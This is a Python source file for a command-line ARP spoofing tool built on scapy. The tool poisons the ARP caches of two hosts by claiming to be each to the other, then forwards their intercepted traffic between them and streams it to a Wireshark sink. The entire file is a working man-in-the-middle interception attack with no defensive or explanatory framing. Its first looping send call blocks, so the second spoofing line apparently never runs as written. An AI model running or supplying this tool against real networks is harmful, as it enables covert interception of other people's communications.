from scapy.all import *
import argparse

def get_true_mac(ip):
    return getmacbyip(ip)

def arp_spoof_packet(target_ip, gateway_ip):
    return Ether(dst = get_true_mac(target_ip)) / ARP(op=2, pdst=target_ip, psrc=gateway_ip) # send to target_ip that we are the gateway

class MITMFilter(Drain):
    def __init__(self, ip_a, ip_b, mac_a, mac_b):
        Drain.__init__(self, name=None)
        self.ip_a = ip_a
        self.ip_b = ip_b
        self.mac_a = mac_a
        self.mac_b = mac_b
    def push(self, msg):
        if msg.haslayer(IP):
            if msg[IP].src == self.ip_a and msg[IP].dst == self.ip_b:
                msg[Ether].dst = self.mac_b
                self._send(msg)
            elif msg[IP].src == self.ip_b and msg[IP].dst == self.ip_a:
                msg[Ether].dst = self.mac_a
                self._send(msg)

class Forwarder(Sink):
    def push(self, msg):
        send(msg)
    

def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
    parser.add_argument("ip_a", help="IP address of device A")
    parser.add_argument("ip_b", help="IP address of device B")
    parser.add_argument("--iface", help="Network interface to use", default=conf.iface)
    args = parser.parse_args()

    source = SniffSource(iface=args.iface)
    mac_a = get_true_mac(args.ip_a)
    mac_b = get_true_mac(args.ip_b)

    print(f"MAC address of {args.ip_a}: {mac_a}")
    print(f"MAC address of {args.ip_b}: {mac_b}")

    filter = MITMFilter(args.ip_a, args.ip_b, mac_a, mac_b)
    forwarder = Forwarder()
    wire = WiresharkSink()
    source > filter
    filter > forwarder
    filter > wire

    p = PipeEngine(source)
    p.start()


    send(arp_spoof_packet(args.ip_a, args.ip_b), loop=1, inter=1, verbose=False)
    send(arp_spoof_packet(args.ip_b, args.ip_a), loop=1, inter=1, verbose=False)

    p.wait_and_stop()

if __name__ == "__main__":
    main()